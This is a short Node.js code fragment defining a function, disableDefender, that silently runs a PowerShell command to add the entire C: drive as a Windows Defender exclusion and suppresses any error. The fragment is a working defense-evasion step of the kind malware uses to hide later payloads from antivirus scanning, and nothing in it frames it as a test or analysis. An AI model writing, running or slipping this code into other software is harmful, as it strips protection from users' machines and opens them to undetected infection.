const childprocess = require('child_process');

function disableDefender() {
    try {
        childprocess.execSync(`powershell -Command "Set-MpPreference -ExclusionPath C:\\ "`)
    } catch (e) {}
}
